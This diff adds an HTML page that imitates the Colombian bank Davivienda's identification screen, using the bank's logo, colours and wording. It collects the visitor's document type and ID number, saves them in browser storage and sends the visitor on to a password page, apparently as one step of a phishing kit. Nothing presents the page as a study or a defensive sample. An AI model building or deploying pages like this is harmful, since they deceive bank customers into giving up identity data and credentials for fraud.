@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="./imagenes/unnamed.png?v=2">
+    <title>Davivienda - Identificación</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Open Sans', sans-serif;
+        }
+        .input-focus:focus {
+            border-color: #ED1C24;
+            outline: none;
+        }
+        .checkbox-custom {
+            width: 18px;
+            height: 18px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            appearance: none;
+            -webkit-appearance: none;
+            outline: none;
+            cursor: pointer;
+            position: relative;
+        }
+        .checkbox-custom:checked {
+            background-color: #fff;
+            border-color: #ED1C24;
+        }
+        .checkbox-custom:checked::after {
+            content: '✓';
+            position: absolute;
+            top: -2px;
+            left: 2px;
+            color: #ED1C24;
+            font-size: 14px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body class="bg-white flex flex-col min-h-screen">
+    <div class="w-full max-w-md mx-auto px-6 pt-8 pb-4">
+        <!-- Logo -->
+        <div class="flex justify-center mb-12">
+            <img src="./imagenes/Davivienda-Logo-EPS-vector-image.png" alt="Davivienda" class="w-[240px] object-contain">
+        </div>
+
+        <!-- Greeting -->
+        <div class="mb-8">
+            <h1 class="text-[22px] font-normal text-[#333] mb-1">¡Hola!</h1>
+            <h2 class="text-[24px] font-bold text-[#333] leading-tight">Nos alegra que esté aquí</h2>
+        </div>
+
+        <!-- Form -->
+        <form id="loginForm" onsubmit="return sender()" class="space-y-6">
+            <div class="space-y-2">
+                <label class="block text-[15px] text-[#666]">Seleccione su tipo de documento</label>
+                <div class="relative">
+                    <select id="tipoDoc" class="w-full h-[50px] border border-[#ccc] rounded-[10px] px-4 appearance-none bg-white text-[#333] text-[16px] focus:outline-none focus:border-[#ED1C24]">
+                        <option value="Cedula de Ciudadania">Cedula de Ciudadania</option>
+                        <option value="Cedula de Extranjeria">Cedula de Extranjeria</option>
+                        <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
+                        <option value="Pasaporte">Pasaporte</option>
+                    </select>
+                    <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none">
+                        <svg class="w-5 h-5 text-[#333]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-2">
+                <label class="block text-[15px] text-[#666]">Ingrese su número de documento</label>
+                <input type="tel" id="numDoc" class="w-full h-[50px] border border-[#ccc] rounded-[10px] px-4 text-[#333] text-[16px] focus:outline-none focus:border-[#ED1C24]" required>
+            </div>
+
+            <div class="flex items-center space-x-3 pt-2">
+                <input type="checkbox" id="remember" class="checkbox-custom">
+                <label for="remember" class="text-[15px] text-[#666]">Recordar mis datos de identidad</label>
+            </div>
+
+            <div class="pt-6">
+                <button type="submit" class="w-full h-[54px] bg-[#ED1C24] text-white font-bold text-[18px] rounded-full hover:bg-[#d11a20] transition-colors">
+                    Continuar
+                </button>
+            </div>
+        </form>
+
+        <div class="mt-6 text-center">
+            <a href="index.html" class="text-[#ED1C24] text-[15px] font-semibold">Volver al inicio</a>
+        </div>
+
+        <!-- Divider -->
+        <div class="mt-20 pt-8 border-t border-[#eee]"></div>
+    </div>
+
+    <script>
+        function sender() {
+            const tipo = document.getElementById("tipoDoc").value;
+            const num = document.getElementById("numDoc").value;
+
+            if (!num) return false;
+
+            // Save to localStorage
+            localStorage.setItem('davivienda_doc_type', tipo);
+            localStorage.setItem('davivienda_doc_num', num);
+            localStorage.setItem('userName', `${tipo} ${num}`);
+
+            // Redirect to password page
+            window.location.href = 'clave.html';
+            return false;
+        }
+    </script>
+</body>
+</html>
